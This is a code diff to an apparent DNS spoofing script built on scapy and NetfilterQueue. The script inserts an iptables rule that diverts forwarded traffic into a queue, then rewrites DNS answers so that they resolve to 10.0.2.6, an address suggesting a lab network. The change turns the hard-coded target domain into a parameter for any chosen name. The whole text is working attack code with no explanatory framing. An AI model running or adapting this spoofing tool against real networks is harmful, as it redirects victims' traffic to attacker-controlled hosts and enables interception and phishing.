@@ -3,9 +3,11 @@ from scapy.all import *
 import os
 from netfilterqueue import NetfilterQueue
 
+
 def modify(packet):
 
     dnsPacket = IP(packet.get_payload())
+    print(address)
 
     print("og packet")
     dnsPacket.show()
@@ -35,7 +37,7 @@ def modify(packet):
         modifiedPacket[DNS].ar = None
 
 
-        modifiedPacket[DNS].an = DNSRR(rrname = "www.google.com", type=dnsPacket[DNS].an.type, rdata='10.0.2.6', rclass=dnsPacket[DNS].an.rclass, rdlen=dnsPacket[DNS].an.rdlen, ttl=100)
+        modifiedPacket[DNS].an = DNSRR(rrname = address , type=dnsPacket[DNS].an.type, rdata='10.0.2.6', rclass=dnsPacket[DNS].an.rclass, rdlen=dnsPacket[DNS].an.rdlen, ttl=100)
 
         #calculate the checksum
         print("new packet")
@@ -49,8 +51,11 @@ def modify(packet):
 
     
 
-def dns_spoof():
+def dns_spoof(addr):
     
+    global address
+    address = addr
+
     os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num  1")
     queue = NetfilterQueue()
     queue.bind(1, modify)
